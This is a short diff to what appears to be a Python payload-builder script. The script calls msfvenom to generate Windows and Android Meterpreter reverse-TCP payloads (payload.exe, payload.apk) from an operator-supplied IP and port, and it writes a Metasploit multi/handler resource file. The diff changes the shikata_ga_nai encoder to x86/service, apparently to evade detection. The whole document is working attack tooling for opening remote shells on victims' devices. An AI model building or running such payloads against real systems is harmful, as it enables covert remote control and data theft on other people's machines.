@@ -40,7 +40,7 @@ def dos():
         lhost=input('Ip: ')
         lport=input('Port: ')
         frmt=input('Format: ')
-        os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f '+frmt+ ' -e x86/shikata_ga_nai -o payload.exe')
+        os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f '+frmt+ ' -e x86/service -o payload.exe')
         with open('initmsfc', 'w') as f:
             f.write('use exploit/multi/handler\n')
             f.write('set payload windows/meterpreter/reverse_tcp\n')
@@ -56,7 +56,7 @@ def tres():
     else:
         lhost=input('Ip: ')
         lport=input('Port: ')
-        os.system('msfvenom -p android/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -e x86/shikata_ga_nai -o payload.apk')
+        os.system('msfvenom -p android/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -e x86/service -o payload.apk')
         with open('initmsfc', 'w') as f:
             f.write('use exploit/multi/handler\n')
             f.write('set payload android/meterpreter/reverse_tcp\n')
